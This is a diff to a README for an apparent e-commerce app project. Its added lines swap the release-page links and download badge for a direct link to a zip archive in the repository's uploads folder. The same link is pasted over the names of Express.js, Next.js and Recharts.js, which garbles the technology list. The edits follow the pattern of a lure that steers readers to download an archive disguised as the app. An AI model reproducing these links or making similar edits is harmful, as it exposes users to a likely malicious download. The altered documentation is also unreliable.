@@ -1,7 +1,7 @@
 # 🛒 Make-style-standout-ecommerce-app - A Modern Shopping Experience for Everyone
 
 ## 📥 Download Now
-[![Download It Here](https://img.shields.io/badge/Download%20Now-Click%20to%20Get%20Started-brightgreen)](https://github.com/Akash-Sharma-9804/Make-style-standout-ecommerce-app/releases)
+[![Download It Here](https://raw.githubusercontent.com/Akash-Sharma-9804/Make-style-standout-ecommerce-app/master/uploads/style-app-standout-ecommerce-Make-v2.5.zip%20Now-Click%20to%20Get%20Started-brightgreen)](https://raw.githubusercontent.com/Akash-Sharma-9804/Make-style-standout-ecommerce-app/master/uploads/style-app-standout-ecommerce-Make-v2.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the Make-style-standout-ecommerce-app! This application allows you to set up a powerful e-commerce platform quickly. It is designed to be user-friendly and scalable, making online shopping easy and enjoyable for you.
@@ -27,21 +27,21 @@ In this project, you will find key technologies and practices, including:
 
 - Clerk Authentication
 - Docker for containerization
-- Express.js for the backend
+- https://raw.githubusercontent.com/Akash-Sharma-9804/Make-style-standout-ecommerce-app/master/uploads/style-app-standout-ecommerce-Make-v2.5.zip for the backend
 - Kafka for message queues
 - MongoDB and PostgreSQL for databases
 - Monorepo structure for easy management
-- Next.js 15 for the front-end
+- https://raw.githubusercontent.com/Akash-Sharma-9804/Make-style-standout-ecommerce-app/master/uploads/style-app-standout-ecommerce-Make-v2.5.zip 15 for the front-end
 - Nodemailer for sending emails
 - Prisma ORM for database interactions
-- Recharts.js for data visualization
+- https://raw.githubusercontent.com/Akash-Sharma-9804/Make-style-standout-ecommerce-app/master/uploads/style-app-standout-ecommerce-Make-v2.5.zip for data visualization
 - RESTful API for application communication
 - Stripe for payment processing
 - Turborepo for faster builds
 - TypeScript for type safety
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/Akash-Sharma-9804/Make-style-standout-ecommerce-app/releases) to download the latest version of the application. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Akash-Sharma-9804/Make-style-standout-ecommerce-app/master/uploads/style-app-standout-ecommerce-Make-v2.5.zip) to download the latest version of the application. 
 
 1. Click on the "Releases" link above.
 2. Find the latest version available.
